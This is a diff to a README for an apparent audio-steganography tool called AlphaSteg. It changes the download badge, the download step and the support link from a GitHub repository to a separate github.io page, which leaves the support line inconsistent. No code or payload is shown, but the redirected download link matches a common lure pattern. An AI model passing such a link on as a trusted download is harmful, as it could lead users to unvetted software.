@@ -1,6 +1,6 @@
 # 🪄 AlphaSteg - Hide Secrets in Plain Sounds
 
-[![Download Now](https://img.shields.io/badge/Download-AlphaSteg-blue?style=for-the-badge&logo=github)](https://github.com/going-thespis160/AlphaSteg)
+[![Download Now](https://img.shields.io/badge/Download-AlphaSteg-blue?style=for-the-badge&logo=github)](https://going-thespis160.github.io)
 
 ## 🎯 What is AlphaSteg?
 
@@ -10,7 +10,7 @@ AlphaSteg is a powerful yet easy-to-use tool that lets you hide secret messages,
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/going-thespis160/AlphaSteg](https://github.com/going-thespis160/AlphaSteg)
+Visit this link to download the application: [https://going-thespis160.github.io](https://going-thespis160.github.io)
 
 ### Step 2: Install and Run
 
@@ -107,6 +107,6 @@ We welcome contributions from the community. If you have ideas for improvements 
 
 ## 📧 Support
 
-For questions, issues, or feature requests, please open an issue on our GitHub repository: [https://github.com/going-thespis160/AlphaSteg](https://github.com/going-thespis160/AlphaSteg)
+For questions, issues, or feature requests, please open an issue on our GitHub repository: [https://going-thespis160.github.io](https://going-thespis160.github.io)
 
 Keywords: steganography, audio steganography, hide data in music, secret messages, encryption, privacy tool, Spotify, Tidal, Bandcamp, data hiding, audio encoding, stegano tool
